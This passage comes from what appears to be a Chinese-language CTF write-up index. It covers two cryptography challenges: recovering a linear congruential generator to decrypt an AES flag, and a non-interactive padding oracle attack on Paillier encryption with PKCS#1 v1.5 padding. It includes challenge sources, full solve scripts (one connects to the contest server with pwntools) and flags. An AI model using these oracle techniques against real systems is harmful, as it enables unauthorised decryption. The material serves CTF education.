, long_to_bytes def f ( s ): return ( a * s + b ) % p jumps , opt , enc = open ( 'output.txt' ) . readlines () jumps , opt = eval ( jumps ), eval ( opt ) s , * opt = opt same_sum = dict () for l in range ( 1 , len ( jumps )): for i in range ( len ( jumps ) - l + 1 ): if ( sm := sum ( jumps [ i : i + l ])) not in same_sum : same_sum [ sm ] = [( i - 1 , i + l - 1 )] else : same_sum [ sm ] . append (( i - 1 , i + l - 1 )) p , mn = 0 , None for k , v in same_sum . items (): if len ( v ) == 3 : if mn is None : # \u8bb0\u5f55\u6700\u5c0f\u6ee1\u8db3\u6761\u4ef6\u7684\u5b50\u6570\u7ec4\u548c\u53ca\u76f8\u5e94\u7684\u5b50\u6570\u7ec4\u96c6\u5408 mn = ( k , v ) A , B , C = [[ opt [ i [ 0 ]], opt [ i [ 1 ]]] for i in v ] res = ( A [ 1 ] - B [ 1 ]) * ( B [ 0 ] - C [ 0 ]) - ( A [ 0 ] - B [ 0 ]) * ( B [ 1 ] - C [ 1 ]) p = gcd ( res , p ) A , B , C = [[ opt [ i [ 0 ]], opt [ i [ 1 ]]] for i in mn [ 1 ]] a_s = nthroot_mod (( A [ 1 ] - B [ 1 ]) * inverse ( A [ 0 ] - B [ 0 ], p ), mn [ 0 ], p , all_roots = True ) for a in a_s : try : # f(x) = a^n*s + b*(a^(n-1)+a^(n-2)+...+a+1) b = ( opt [ 0 ] - a ** jumps [ 0 ] * s ) * inverse ( sum ( a ** i for i in range ( jumps [ 0 ])), p ) % p test = s for _ in range ( sum ( jumps [: 2 ])): test = f ( test ) assert test == opt [ 1 ] break except : continue key = sha256 ( b \"\" . join ([ long_to_bytes ( x ) for x in [ a , b , p ]])) . digest ()[: 16 ] iv = bytes . fromhex ( enc [: 32 ]) flag = AES . new ( key , AES . MODE_CBC , iv = iv ) . decrypt ( bytes . fromhex ( enc [ 32 :])) print ( flag ) Flag \u00b6 corctf{:msfrog:_is_pr0ud_0f_y0ur_l34pfr0gg1ng_4b1lit135}","title":"leapfrog"},{"location":"crypto/leapfrog/#_1","text":"leapfrog.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 from Crypto.Util.number import long_to_bytes , getPrime from Crypto.Cipher import AES from Crypto.Util.Padding import pad from hashlib import sha256 from secrets import randbelow from random import sample p = getPrime ( 256 ) a = randbelow ( p ) b = randbelow ( p ) s = randbelow ( p ) def f ( s ): return ( a * s + b ) % p jumps = sample ( range ( 3 , 25 ), 12 ) output = [ s ] for jump in jumps : for _ in range ( jump ): s = f ( s ) output . append ( s ) print ( jumps ) print ( output ) flag = open ( \"flag.txt\" , \"rb\" ) . read () key = sha256 ( b \"\" . join ([ long_to_bytes ( x ) for x in [ a , b , p ]])) . digest ()[: 16 ] iv = long_to_bytes ( randbelow ( 2 ** 128 )) cipher = AES . new ( key , AES . MODE_CBC , iv = iv ) print ( iv . hex () + cipher . encrypt ( pad ( flag , 16 )) . hex ()) output.txt 1 2 3 [5, 3, 23, 13, 24, 6, 10, 9, 7, 4, 19, 16] [26242498579536691811055981149948736081413123636643477706015419836101346754443, 30320412755241177141099565765265147075632060183801443609889236855980299685595, 65684356693401962957802832810273549345608027337432965824937963429120291339333, 15025547765549333168957368149177848577882555487889680742466312084547650972663, 46764069432060214735440855620792051531943268335710103593983788232446614161424, 71575544531523096893697176151110271985899529970263634996534766185719951232899, 8149547548198503668415702507621754973088994278880874813606458793607866713778, 12081871161483608517505346339140143493132928051760353815508503241747142024697, 65627056932006241674763356339068429188278123434638526706264676467885955099667, 23413741607307309476964696379608864503970503243566103692132654387385869400762, 56014408298982744092873649879675961526790332954773022900206888891912862484806, 77000766146189604405769394813422399327596415228762086351262010618717119973525, 14589246063765426640159853561271509992635998018136452450026806673980229327448] 05ac5b17c67bcfbf5c43fa9d319cfc4c62ee1ce1ab2130846f776e783e5797ac1c02a34045e4130f3b8111e57397df344bd0e14f3df4f1a822c43c7a89fd4113f9a7702b0b0e0b0473a2cbac25e1dd9c","title":"\u9898\u76ee"},{"location":"crypto/leapfrog/#_2","text":"\u4e0e exchanged \u7c7b\u4f3c\uff0c\u540c\u6837\u4f7f\u7528\u5230\u4e86\u51fd\u6570 \\(f(x)\\) \uff0c\u4e0d\u8fc7 \\(p,a,b\\) \u6ca1\u6709\u76f4\u63a5\u7ed9\u51fa \u5df2\u77e5\u521d\u59cb\u503c \\(s\\) \u3001\u6bcf\u6b21\u8fed\u4ee3\u7684\u6b21\u6570\u53ca\u7ed3\u679c \u8bbe \\(B\\) \u662f \\(A\\) \u7ecf\u8fc7 \\(n\\) \u6b21 \\(f\\) \u8fed\u4ee3\u540e\u7684\u7ed3\u679c\uff0c\u90a3\u4e48\u6709 \\(B + t = a^n(A + t)\\) \u3002\u6ce8\u610f\u5230\u6570\u7ec4 jumps \u5b58\u5728\u591a\u4e2a\u5b50\u6570\u7ec4\u96c6\u5408\uff0c\u6ee1\u8db3\u540c\u4e00\u96c6\u5408\u5185\u5b50\u6570\u7ec4\u7684\u548c\u76f8\u540c \u8bbe\u5b58\u5728\u4e2d\u95f4\u8fed\u4ee3\u7ed3\u679c \\(A,B,C,D\\) \u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \\[\\begin{equation} \\begin{split} B+t \\equiv a^n(A+t)\\ (mod\\ p) \\\\ C+t \\equiv a^n(B+t)\\ (mod\\ p) \\\\ D+t \\equiv a^n(C+t)\\ (mod\\ p) \\\\ \\end{split} \\end{equation}\\] \u90a3\u4e48\u6709 \\((B-C)\\equiv a^n(A-B)\\ (mod\\ p)\\) \u4ee5\u53ca \\((C-D)\\equiv a^n(B-C)\\ (mod\\ p)\\) \uff0c\u4e24\u5f0f\u76f8\u9664\u6d88\u53bb \\(a\\) \u53ef\u5f97 \\((B-C)(C-D)^{-1}\\equiv (A-B)(B-C)^{-1}\\ (mod\\ p)\\) \uff0c\u5373 \\((B-C)(B-C)-(A-B)(C-D)\\equiv 0\\ (mod\\ p)\\) \uff08\u4e0e \\((B-D)(B-C)-(A-C)(C-D)\\equiv 0\\ (mod\\ p)\\) \u662f\u7b49\u4ef7\uff09 \u7ed3\u5408\u591a\u4e2a\u5b50\u6570\u7ec4\u96c6\u5408\uff0c\u901a\u8fc7 GCD \u6c42\u51fa \\(p\\) \uff0c\u968f\u540e\u518d\u6c42\u51fa \\(a,b\\) \u5373\u53ef","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/leapfrog/#exploit","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 from math import gcd from sympy import nthroot_mod from hashlib import sha256 from Crypto.Cipher import AES from Crypto.Util.number import inverse , long_to_bytes def f ( s ): return ( a * s + b ) % p jumps , opt , enc = open ( 'output.txt' ) . readlines () jumps , opt = eval ( jumps ), eval ( opt ) s , * opt = opt same_sum = dict () for l in range ( 1 , len ( jumps )): for i in range ( len ( jumps ) - l + 1 ): if ( sm := sum ( jumps [ i : i + l ])) not in same_sum : same_sum [ sm ] = [( i - 1 , i + l - 1 )] else : same_sum [ sm ] . append (( i - 1 , i + l - 1 )) p , mn = 0 , None for k , v in same_sum . items (): if len ( v ) == 3 : if mn is None : # \u8bb0\u5f55\u6700\u5c0f\u6ee1\u8db3\u6761\u4ef6\u7684\u5b50\u6570\u7ec4\u548c\u53ca\u76f8\u5e94\u7684\u5b50\u6570\u7ec4\u96c6\u5408 mn = ( k , v ) A , B , C = [[ opt [ i [ 0 ]], opt [ i [ 1 ]]] for i in v ] res = ( A [ 1 ] - B [ 1 ]) * ( B [ 0 ] - C [ 0 ]) - ( A [ 0 ] - B [ 0 ]) * ( B [ 1 ] - C [ 1 ]) p = gcd ( res , p ) A , B , C = [[ opt [ i [ 0 ]], opt [ i [ 1 ]]] for i in mn [ 1 ]] a_s = nthroot_mod (( A [ 1 ] - B [ 1 ]) * inverse ( A [ 0 ] - B [ 0 ], p ), mn [ 0 ], p , all_roots = True ) for a in a_s : try : # f(x) = a^n*s + b*(a^(n-1)+a^(n-2)+...+a+1) b = ( opt [ 0 ] - a ** jumps [ 0 ] * s ) * inverse ( sum ( a ** i for i in range ( jumps [ 0 ])), p ) % p test = s for _ in range ( sum ( jumps [: 2 ])): test = f ( test ) assert test == opt [ 1 ] break except : continue key = sha256 ( b \"\" . join ([ long_to_bytes ( x ) for x in [ a , b , p ]])) . digest ()[: 16 ] iv = bytes . fromhex ( enc [: 32 ]) flag = AES . new ( key , AES . MODE_CBC , iv = iv ) . decrypt ( bytes . fromhex ( enc [ 32 :])) print ( flag )","title":"Exploit"},{"location":"crypto/leapfrog/#flag","text":"corctf{:msfrog:_is_pr0ud_0f_y0ur_l34pfr0gg1ng_4b1lit135}","title":"Flag"},{"location":"crypto/maybe_someday/","tags":["paillier","padding oracle attack"],"text":"#paillier #padding oracle attack .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 Leave me your ciphertexts. I will talk to you later. 1 maybe-someday.2022.ctfcompetition.com 1337 chall.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 #!/usr/bin/python3 from Crypto.Util.number import getPrime as get_prime import math import random import os import hashlib # Suppose gcd(p, q) = 1. Find x such that # 1. 0 <= x < p * q, and # 2. x = a (mod p), and # 3. x = b (mod q). def crt ( a , b , p , q ): return ( a * pow ( q , - 1 , p ) * q + b * pow ( p , - 1 , q ) * p ) % ( p * q ) def L ( x , n ): return ( x - 1 ) // n class Paillier : def __init__ ( self ): p = get_prime ( 1024 ) q = get_prime ( 1024 ) n = p * q \u03bb = ( p - 1 ) * ( q - 1 ) // math . gcd ( p - 1 , q - 1 ) # lcm(p-1, q-1) g = random . randint ( 0 , n - 1 ) \u00b5 = pow ( L ( pow ( g , \u03bb , n ** 2 ), n ), - 1 , n ) self . n = n self . \u03bb = \u03bb self . g = g self . \u00b5 = \u00b5 self . p = p self . q = q # https://www.rfc-editor.org/rfc/rfc3447#section-7.2.1 def pad ( self , m ): padding_size = 2048 // 8 - 3 - len ( m ) if padding_size < 8 : raise Exception ( 'message too long' ) random_padding = b ' \\0 ' * padding_size while b ' \\0 ' in random_padding : random_padding = os . urandom ( padding_size ) return b ' \\x00\\x02 ' + random_padding + b ' \\x00 ' + m def unpad ( self , m ): if m [: 2 ] != b ' \\x00\\x02 ' : raise Exception ( 'decryption error' ) random_padding , m = m [ 2 :] . split ( b ' \\x00 ' , 1 ) if len ( random_padding ) < 8 : raise Exception ( 'decryption error' ) return m def public_key ( self ): return ( self . n , self . g ) def secret_key ( self ): return ( self . \u03bb , self . \u00b5 ) def encrypt ( self , m ): g = self . g n = self . n m = self . pad ( m ) m = int . from_bytes ( m , 'big' ) r = random . randint ( 0 , n - 1 ) c = pow ( g , m , n ** 2 ) * pow ( r , n , n ** 2 ) % n ** 2 return c def decrypt ( self , c ): \u03bb = self . \u03bb \u00b5 = self . \u00b5 n = self . n m = L ( pow ( c , \u03bb , n ** 2 ), n ) * \u00b5 % n m = m . to_bytes ( 2048 // 8 , 'big' ) return self . unpad ( m ) def fast_decrypt ( self , c ): \u03bb = self . \u03bb \u00b5 = self . \u00b5 n = self . n p = self . p q = self . q rp = pow ( c , \u03bb , p ** 2 ) rq = pow ( c , \u03bb , q ** 2 ) r = crt ( rp , rq , p ** 2 , q ** 2 ) m = L ( r , n ) * \u00b5 % n m = m . to_bytes ( 2048 // 8 , 'big' ) return self . unpad ( m ) def challenge ( p ): secret = os . urandom ( 2 ) secret = hashlib . sha512 ( secret ) . hexdigest () . encode () c0 = p . encrypt ( secret ) print ( f ' { c0 = } ' ) # # The secret has 16 bits of entropy. # # Hence 16 oracle calls should be sufficient, isn't it? # for _ in range(16): # c = int(input()) # try: # p.decrypt(c) # print('\ud83d\ude00') # except: # print('\ud83d\ude21') # I decided to make it non-interactive to make this harder. # Good news: I'll give you 25% more oracle calls to compensate, anyways. cs = [ int ( input ()) for _ in range ( 20 )] for c in cs : try : p . fast_decrypt ( c ) print ( '\ud83d\ude00' ) except : print ( '\ud83d\ude21' ) guess = input () . encode () if guess != secret : raise Exception ( 'incorrect guess!' ) def main (): with open ( '/flag.txt' , 'r' ) as f : flag = f . read () p = Paillier () n , g = p . public_key () print ( f ' { n = } ' ) print ( f ' { g = } ' ) try : # Once is happenstance. Twice is coincidence... # Sixteen times is a recovery of the pseudorandom number generator. for _ in range ( 16 ): challenge ( p ) print ( '\ud83d\udca1' ) print ( f '\ud83c\udfc1 { flag } ' ) except : print ( '\ud83d\udc4b' ) if __name__ == '__main__' : main () \u89e3\u9898\u601d\u8def \u00b6 \u9700\u8981\u5728\u9650\u5236\u67e5\u8be2\u6b21\u6570\u4e14\u65e0\u4ea4\u4e92\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c Padding Oracle \u653b\u51fb\uff0c\u9488\u5bf9\u4f7f\u7528 EME-PKCS1-v1_5 \u65b9\u6848 1 \u586b\u5145\u7684 Paillier \u52a0\u5bc6\u7cfb\u7edf \u5c3d\u7ba1\u6bcf\u8f6e\u67e5\u8be2\u673a\u4f1a\u4ec5 \\(20\\) \u6b21\uff0c\u4f46\u76ee\u6807\u660e\u6587\u53ea\u6709 \\(65536\\) \u79cd\u60c5\u51b5\uff0c\u77e5\u9053 \\(4\\) \u4e2a\u5b57\u8282\u4ee5\u4e0a\u5c31\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\uff0c\u4e0d\u8fc7\u8003\u8651\u5230\u987a\u5e8f\u76f8\u5173\u7684\u4fe1\u606f\u65e0\u6cd5\u83b7\u5f97\uff0c\u67e5\u8be2\u8303\u56f4\u53ef\u4ee5\u7a0d\u7a0d\u6269\u5927\u4e00\u4e9b 1 2 secret = os . urandom ( 2 ) secret = hashlib . sha512 ( secret ) . hexdigest () . encode () EME-PKCS1-v1_5 \u662f\u4e3a RSA \u8bbe\u8ba1\u7684\u586b\u5145\u65b9\u6848\uff0c\u4e5f\u6709\u73b0\u6210\u7684\u653b\u51fb\u65b9\u6cd5\uff0c\u4f46\u5bf9\u5177\u6709\u52a0\u6cd5\u540c\u6001\u6027\u7684 Paillier \u6765\u8bf4\uff0cPadding Oracle \u653b\u51fb\u7684\u5b9e\u65bd\u5c06\u66f4\u7b80\u5355\u4e00\u4e9b \u5173\u4e8e Paillier \u7684\u52a0\u6cd5\u540c\u6001\u6027\u53ef\u53c2\u8003 Crypto - P(ai)^3 \u88ab\u8ba4\u4e3a\u6b63\u786e\u7684\u586b\u5145\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 00 02 PS 00 M \u7b2c\u4e00\u3001\u4e8c\u5b57\u8282\u4e3a \\x00\\x02 \u9664\u7b2c\u4e00\u5b57\u8282\u5916\uff0c\u5b58\u5728\u53e6\u4e00\u4e2a \\x00 \u5b57\u8282\u5212\u5206\u4e0d\u5305\u542b \\x00 \u5b57\u8282\u7684\u4f2a\u968f\u673a\u5b57\u8282\u4e32 PS \u4ee5\u53ca\u6d88\u606f M PS \u7684\u957f\u5ea6\u4e0d\u5c11\u4e8e \\(8\\) \u5b57\u8282 \u56e0\u4e3a\u586b\u5145\u9a8c\u8bc1\u5e76\u6ca1\u6709\u5bf9 PS \u505a\u8fc7\u591a\u7684\u9650\u5236\uff0c\u4e0d\u5305\u542b\u5b57\u8282 \\x00 \u4e14\u957f\u5ea6\u4e0d\u5c11\u4e8e \\(8\\) \u5b57\u8282\u5373\u53ef\u3002\u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7\u52a0\u6cd5\u6d88\u53bb\u5206\u9694\u7b26 \\x00 \u5b57\u8282\uff0c\u800c\u540e\u679a\u4e3e\u6d88\u606f\u7684\u5404\u4e2a\u5b57\u8282\u3002\u5047\u8bbe\u76ee\u6807\u660e\u6587\u586b\u5145\u540e\u4e3a \\(m\\) \uff0c\u4e14 \\(m+m_0\\) \u6070\u597d\u4f7f\u539f\u5206\u9694\u7b26\u5931\u6548\u3002\u8bbe \\(b=2^8,m_1=j\\cdot b^i\\) \uff0c\u82e5 \\(j\\) \u7684\u503c\u4e0e\u76ee\u6807\u660e\u6587\u53f3\u6570\u7b2c \\(i\\) \u5b57\u8282\u7684\u503c\u76f8\u540c\uff0c\u5219 \\(m+m_0-m_1\\) \u5c06\u4ea7\u751f\u65b0\u7684 \\x00 \u5b57\u8282\u4f5c\u4e3a\u5206\u9694\u7b26\uff0c\u4f7f\u5f97\u586b\u5145\u9a8c\u8bc1\u80fd\u591f\u901a\u8fc7 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 from hashlib import sha512 from Crypto.Util.number import inverse import pwn cnt = 8 hashes = dict () for b in range ( 0x10000 ): h = sha512 ( int . to_bytes ( b , 2 , 'big' )) . hexdigest () hashes [ h [: cnt * 2 ]] = h conn = pwn . remote ( 'maybe-someday.2022.ctfcompetition.com' , 1337 ) n = int ( conn . recvline_contains ( 'n = ' ) . decode () . split ( ' ' )[ - 1 ]) g = int ( conn . recvline_contains ( 'g = ' ) . decode () . split ( ' ' )[ - 1 ]) rm_delim = pow ( g , 0xff << 1024 , n ** 2 ) for _ in range ( 16 ): c0 = int ( conn . recvline_contains ( 'c0 = ' ) . decode () . split ( ' ' )[ - 1 ]) c1 = c0 * rm_delim % ( n ** 2 ) for i in range ( 20 ): if i in range ( 16 ): # \u95f4\u9694\u679a\u4e3e\uff0c\u907f\u514d\u501f\u4f4d\u7684\u5f71\u54cd msg = c1 * inverse ( pow ( g , int ( f \" { ord ( f ' { i : x } ' ) : 04x } \" * cnt , 16 ) << ( 1024 - cnt * 8 * 2 + 8 ), n ** 2 ), n ** 2 ) % n ** 2 else : msg = c1 * inverse ( pow ( g , int ( f \" { ord ( f ' { ( i - 16 ) : x } ' ) : 04x } \" * cnt , 16 ) << ( 1024 - cnt * 8 * 2 ), n ** 2 ), n ** 2 ) % n ** 2 conn . sendline ( str ( msg )) res = [ 0 ] * 20 for i in range ( 20 ): ret = conn . recvline () . decode () if '\ud83d\ude00' in ret : res [ i ] = 1 ans = [] for k , v in hashes . items (): ans . append ( v ) h1 , h2 = k [:: 2 ], k [ 1 :: 2 ] for i in range ( 20 ): if i in range ( 16 ): if res [ i ] and f ' { i : x } ' not in h1 : ans = ans [: - 1 ] break elif not res [ i ] and f ' { i : x } ' in h1 : ans = ans [: - 1 ] break else : if res [ i ] and f ' { ( i - 16 ) : x } ' not in h2 : ans = ans [: - 1 ] break elif not res [ i ] and f ' { ( i - 16 ) : x } ' in h2 : ans = ans [: - 1 ] break conn . sendline ( str ( ans [ 0 ])) ret = conn . recvline () . decode () if '\ud83d\udca1' not in ret : print ( ':(' ) break conn . interactive () Flag \u00b6 CTF{p4dd1n9_or4cl3_w1th_h0mom0rph1c_pr0p3r7y_c0m6in3d_in7o_a_w31rd_m47h_puzz1e} RFC 3447: Public-Key Cryptography Standards (PKCS) #1: RSA Cryptography Specifications Version 2.1 \u21a9","title":"Maybe Someday"},{"location":"crypto/maybe_someday/#_1","text":"Leave me your ciphertexts. I will talk to you later. 1 maybe-someday.2022.ctfcompetition.com 1337 chall.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 #!/usr/bin/python3 from Crypto.Util.number import getPrime as get_prime import math import random import os import hashlib # Suppose gcd(p, q) = 1. Find x such that # 1. 0 <= x < p * q, and # 2. x = a (mod p), and # 3. x = b (mod q). def crt ( a , b , p , q ): return ( a * pow ( q , - 1 , p ) * q + b * pow ( p , - 1 , q ) * p ) % ( p * q ) def L ( x , n ): return ( x - 1 ) // n class Paillier : def __init__ ( self ): p = get_prime ( 1024 ) q = get_prime ( 1024 ) n = p * q \u03bb = ( p - 1 ) * ( q - 1 ) // math . gcd ( p - 1 , q - 1 ) # lcm(p-1, q-1) g = random . randint ( 0 , n - 1 ) \u00b5 = pow ( L ( pow ( g , \u03bb , n ** 2 ), n ), - 1 , n ) self . n = n self . \u03bb = \u03bb self . g = g self . \u00b5 = \u00b5 self . p = p self . q = q # https://www.rfc-editor.org/rfc/rfc3447#section-7.2.1 def pad ( self , m ): padding_size = 2048 // 8 - 3 - len ( m ) if padding_size < 8 : raise Exception ( 'message too long' ) random_padding = b ' \\0 ' * padding_size while b ' \\0 ' in random_padding : random_padding = os . urandom ( padding_size ) return b ' \\x00\\x02 ' + random_padding + b ' \\x00 ' + m def unpad ( self , m ): if m [: 2 ] != b ' \\x00\\x02 ' : raise Exception ( 'decryption error' ) random_padding , m = m [ 2 :] . split ( b ' \\x00 ' , 1 ) if len ( random_padding ) < 8 : raise Exception ( 'decryption error' ) return m def public_key ( self ): return ( self . n , self . g ) def secret_key ( self ): return ( self . \u03bb , self . \u00b5 ) def encrypt ( self , m ): g = self . g n = self . n m = self . pad ( m ) m = int . from_bytes ( m , 'big' ) r = random . randint ( 0 , n - 1 ) c = pow ( g , m , n ** 2 ) * pow ( r , n , n ** 2 ) % n ** 2 return c def decrypt ( self , c ): \u03bb = self . \u03bb \u00b5 = self . \u00b5 n = self . n m = L ( pow ( c , \u03bb , n ** 2 ), n ) * \u00b5 % n m = m . to_bytes ( 2048 // 8 , 'big' ) return self . unpad ( m ) def fast_decrypt ( self , c ): \u03bb = self . \u03bb \u00b5 = self . \u00b5 n = self . n p = self . p q = self . q rp = pow ( c , \u03bb , p ** 2 ) rq = pow ( c , \u03bb , q ** 2 ) r = crt ( rp , rq , p ** 2 , q ** 2 ) m = L ( r , n ) * \u00b5 % n m = m . to_bytes ( 2048 // 8 , 'big' ) return self . unpad ( m ) def challenge ( p ): secret = os . urandom ( 2 ) secret = hashlib . sha512 ( secret ) . hexdigest () . encode () c0 = p . encrypt ( secret ) print ( f ' { c0 = } ' ) # # The secret has 16 bits of entropy. # # Hence 16 oracle calls should be sufficient, isn't it? # for _ in range(16): # c = int(input()) # try: # p.decrypt(c) # print('\ud83d\ude00') # except: # print('\ud83d\ude21') # I decided to make it non-interactive to make this harder. # Good news: I'll give you 25% more oracle calls to compensate, anyways. cs = [ int ( input ()) for _ in range ( 20 )] for c in cs : try : p . fast_decrypt ( c ) print ( '\ud83d\ude00' ) except : print ( '\ud83d\ude21' ) guess = input () . encode () if guess != secret : raise Exception ( 'incorrect guess!' ) def main (): with open ( '/flag.txt' , 'r' ) as f : flag = f . read () p = Paillier () n , g = p . public_key () print ( f ' { n = } ' ) print ( f ' { g = } ' ) try : # Once is happenstance. Twice is coincidence... # Sixteen times is a recovery of the pseudorandom number generator. for _ in range ( 16 ): challenge ( p ) print ( '\ud83d\udca1' ) print ( f '\ud83c\udfc1 { flag } ' ) except : print ( '\ud83d\udc4b' ) if __name__ == '__main__' : main ()","title":"\u9898\u76ee"},{"location":"crypto/maybe_someday/#_2","text":"\u9700\u8981\u5728\u9650\u5236\u67e5\u8be2\u6b21\u6570\u4e14\u65e0\u4ea4\u4e92\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c Padding Oracle \u653b\u51fb\uff0c\u9488\u5bf9\u4f7f\u7528 EME-PKCS1-v1_5 \u65b9\u6848 1 \u586b\u5145\u7684 Paillier \u52a0\u5bc6\u7cfb\u7edf \u5c3d\u7ba1\u6bcf\u8f6e\u67e5\u8be2\u673a\u4f1a\u4ec5 \\(20\\) \u6b21\uff0c\u4f46\u76ee\u6807\u660e\u6587\u53ea\u6709 \\(65536\\) \u79cd\u60c5\u51b5\uff0c\u77e5\u9053 \\(4\\) \u4e2a\u5b57\u8282\u4ee5\u4e0a\u5c31\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\uff0c\u4e0d\u8fc7\u8003\u8651\u5230\u987a\u5e8f\u76f8\u5173\u7684\u4fe1\u606f\u65e0\u6cd5\u83b7\u5f97\uff0c\u67e5\u8be2\u8303\u56f4\u53ef\u4ee5\u7a0d\u7a0d\u6269\u5927\u4e00\u4e9b 1 2 secret = os . urandom ( 2 ) secret = hashlib . sha512 ( secret ) . hexdigest () . encode () EME-PKCS1-v1_5 \u662f\u4e3a RSA \u8bbe\u8ba1\u7684\u586b\u5145\u65b9\u6848\uff0c\u4e5f\u6709\u73b0\u6210\u7684\u653b\u51fb\u65b9\u6cd5\uff0c\u4f46\u5bf9\u5177\u6709\u52a0\u6cd5\u540c\u6001\u6027\u7684 Paillier \u6765\u8bf4\uff0cPadding Oracle \u653b\u51fb\u7684\u5b9e\u65bd\u5c06\u66f4\u7b80\u5355\u4e00\u4e9b \u5173\u4e8e Paillier \u7684\u52a0\u6cd5\u540c\u6001\u6027\u53ef\u53c2\u8003 Crypto - P(ai)^3 \u88ab\u8ba4\u4e3a\u6b63\u786e\u7684\u586b\u5145\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 00 02 PS 00 M \u7b2c\u4e00\u3001\u4e8c\u5b57\u8282\u4e3a \\x00\\x02 \u9664\u7b2c\u4e00\u5b57\u8282\u5916\uff0c\u5b58\u5728\u53e6\u4e00\u4e2a \\x00 \u5b57\u8282\u5212\u5206\u4e0d\u5305\u542b \\x00 \u5b57\u8282\u7684\u4f2a\u968f\u673a\u5b57\u8282\u4e32 PS \u4ee5\u53ca\u6d88\u606f M PS \u7684\u957f\u5ea6\u4e0d\u5c11\u4e8e \\(8\\) \u5b57\u8282 \u56e0\u4e3a\u586b\u5145\u9a8c\u8bc1\u5e76\u6ca1\u6709\u5bf9 PS \u505a\u8fc7\u591a\u7684\u9650\u5236\uff0c\u4e0d\u5305\u542b\u5b57\u8282 \\x00 \u4e14\u957f\u5ea6\u4e0d\u5c11\u4e8e \\(8\\) \u5b57\u8282\u5373\u53ef\u3002\u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7\u52a0\u6cd5\u6d88\u53bb\u5206\u9694\u7b26 \\x00 \u5b57\u8282\uff0c\u800c\u540e\u679a\u4e3e\u6d88\u606f\u7684\u5404\u4e2a\u5b57\u8282\u3002\u5047\u8bbe\u76ee\u6807\u660e\u6587\u586b\u5145\u540e\u4e3a \\(m\\) \uff0c\u4e14 \\(m+m_0\\) \u6070\u597d\u4f7f\u539f\u5206\u9694\u7b26\u5931\u6548\u3002\u8bbe \\(b=2^8,m_1=j\\cdot b^i\\) \uff0c\u82e5 \\(j\\) \u7684\u503c\u4e0e\u76ee\u6807\u660e\u6587\u53f3\u6570\u7b2c \\(i\\) \u5b57\u8282\u7684\u503c\u76f8\u540c\uff0c\u5219 \\(m+m_0-m_1\\) \u5c06\u4ea7\u751f\u65b0\u7684 \\x00 \u5b57\u8282\u4f5c\u4e3a\u5206\u9694\u7b26\uff0c\u4f7f\u5f97\u586b\u5145\u9a8c\u8bc1\u80fd\u591f\u901a\u8fc7 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 from hashlib import sha512 from Crypto.Util.number import inverse import pwn cnt = 8 hashes = dict () for b in range ( 0x10000 ): h = sha512 ( int . to_bytes ( b , 2 , 'big' )) . hexdigest () hashes [ h [: cnt * 2 ]] = h conn = pwn . remote ( 'maybe-someday.2022.ctfcompetition.com' , 1337 ) n = int ( conn . recvline_contains ( 'n = ' ) . decode () . split ( ' ' )[ - 1 ]) g = int ( conn . recvline_contains ( 'g = ' ) . decode () . split ( ' ' )[ - 1 ]) rm_delim = pow ( g , 0xff << 1024 , n ** 2 ) for _ in range ( 16 ): c0 = int ( conn . recvline_contains ( 'c0 = ' ) . decode () . split ( ' ' )[ - 1 ]) c1 = c0 * rm_delim % ( n ** 2 ) for i in range ( 20 ): if i in range ( 16 ): # \u95f4\u9694\u679a\u4e3e\uff0c\u907f\u514d\u501f\u4f4d\u7684\u5f71\u54cd msg = c1 * inverse ( pow ( g , int ( f \" { ord ( f ' { i : x } ' ) : 04x } \" * cnt , 16 ) << ( 1024 - cnt * 8 * 2 + 8 ), n ** 2 ), n ** 2 ) % n ** 2 else : msg = c1 * inverse ( pow ( g , int ( f \" { ord ( f ' { ( i - 16 ) : x } ' ) : 04x } \" * cnt , 16 ) << ( 1024 - cnt * 8 * 2 ), n ** 2 ), n ** 2 ) % n ** 2 conn . sendline ( str ( 